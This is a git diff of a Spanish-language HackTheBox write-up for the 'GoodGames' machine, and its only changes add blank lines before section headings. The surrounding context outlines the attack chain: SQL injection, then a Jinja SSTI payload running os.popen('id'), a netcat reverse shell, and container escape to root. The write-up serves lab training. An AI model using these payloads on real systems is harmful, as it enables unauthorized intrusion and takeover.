@@ -36,6 +36,7 @@ image:
 `GoodGames` es una máquina `easy linux`, `obtenemos` unas `credenciales` del usuario `admin` a través de una `SQL Injection Error Based`. Una vez logueamos ejecutamos un `SSTI (Server Side Template Injection)` mediante el cual obtenemos un `RCE (Remote Command Execution)` mediante el cual `ganamos acceso` a un `contenedor`. `Escapamos` del `contenedor` y nos `convertimos` en usuario `root`, debido a que un `directorio` de la `máquina víctima` estaba `montado` en el `contenedor`, lo cual nos permitiría `convertirnos` en `root` agregando privilegios `SUID` a la `sh`
 
 ---
+
 ## Reconocimiento
 
 Se comprueba que la `máquina` está `activa` y se determina su `sistema operativo`, el `ttl` de las máquinas `linux` suele ser `64`, en este caso hay un nodo intermediario que hace que el ttl disminuya en una unidad
@@ -50,6 +51,7 @@ PING 10.129.183.190 (10.129.183.190) 56(84) bytes of data.
 2 packets transmitted, 2 received, 0% packet loss, time 1002ms
 rtt min/avg/max/mdev = 57.277/58.624/59.972/1.347 ms
 ```
+
 ### Nmap
 
 Se va a realizar un escaneo de todos los `puertos` abiertos en el protocolo `TCP` a través de `nmap`
@@ -90,6 +92,7 @@ Service Info: Host: goodgames.htb
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
 ```
+
 ### Web Enumeration
 
 Cuando accedemos al `servicio web` vemos esto
@@ -99,6 +102,7 @@ Cuando accedemos al `servicio web` vemos esto
 Si pulsamos arriba a la derecha nos sale este `panel` de `login`
 
 ![](/assets/img/GoodGames/image_2.png)
+
 ## Web Exploitation
 
 He `capturado` la `petición` con `Burpsuite` y he efectuado un `SQLI (Sql Injection)`
@@ -203,6 +207,7 @@ En `PayloadsAllTheThings` [https://github.com/swisskyrepo/PayloadsAllTheThings/t
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 {% endraw %}
+
 ## Intrusión
 
 Vamos a mandarnos una `reverse shell` a nuestro equipo para ganar acceso a la máquina víctima, para ello nos ponemos en escucha con `netcat` por el `puerto 9993`
@@ -231,6 +236,7 @@ root@3a453ab39d3d:/backend# whoami
 whoami
 root
 ```
+
 ## Privilege Escalation
 
 Sin embargo nos encontramos dentro de un `contenedor`
